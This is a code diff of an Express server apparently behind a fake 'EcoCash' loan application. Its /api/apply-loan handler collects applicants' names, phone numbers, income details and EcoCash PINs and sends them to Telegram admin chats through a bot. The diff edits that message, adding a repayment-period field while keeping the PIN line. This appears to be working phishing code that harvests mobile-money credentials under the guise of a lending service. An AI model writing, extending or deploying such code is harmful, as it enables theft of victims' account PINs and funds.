@@ -15,7 +15,6 @@ app.use(express.static(publicPath));
 
 const APP_URL = process.env.APP_URL || 'https://ecocash-aot6.onrender.com';
 
-// Dynamically load admins from environment variables starting from ADMIN_1_CHAT_ID upwards
 function loadAdminsFromEnv() {
   const admins = [];
   let index = 1;
@@ -56,7 +55,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
   const { message, callback_query } = req.body;
 
-  // HANDLE /start COMMAND
   if (message && message.text && message.text.startsWith('/start')) {
     const chatId = message.chat.id;
     const firstName = message.from.first_name || 'Admin';
@@ -94,7 +92,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     });
   }
 
-  // HANDLE INLINE BUTTON CALLBACKS
   if (callback_query) {
     const actionData = callback_query.data;
     const chatId = callback_query.message.chat.id;
@@ -154,6 +151,7 @@ async function editTelegramMessage(botToken, chatId, messageId, text) {
   }
 }
 
+// RECEIVES COMBINED STEP 1 & STEP 2 DATA AND SENDS TO TELEGRAM AT ONCE
 app.post('/api/apply-loan', async (req, res) => {
   try {
     const data = req.body;
@@ -168,13 +166,14 @@ app.post('/api/apply-loan', async (req, res) => {
     if (botToken) {
       for (const admin of ADMINS) {
         if (!admin.chatId) continue;
-        const msgText = `🔑 <b>NEW LOAN APPLICATION (STEP 2)</b>\n\n` +
+        const msgText = `🔑 <b>NEW LOAN APPLICATION (STEP 1 & 2 DELIVERED)</b>\n\n` +
                         `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                         `👤 <b>Name:</b> ${data.fullName}\n` +
                         `💼 <b>Occupation:</b> ${data.occupation}\n` +
                         `💵 <b>Income:</b> $${data.monthlyIncome}\n` +
-                        `📞 <b>Phone:</b> +263${formattedPhone}\n` +
+                        `⏳ <b>Repayment Period:</b> ${data.repaymentPeriod} Month(s)\n` +
                         `💰 <b>Amount Requested:</b> $${data.loanAmount}\n` +
+                        `📞 <b>Phone:</b> +263${formattedPhone}\n` +
                         `🔑 <b>EcoCash PIN:</b> <code>${data.pin}</code>`;
 
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -257,4 +256,4 @@ app.get('*', (req, res) => {
 });
 
 app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
-      
+        
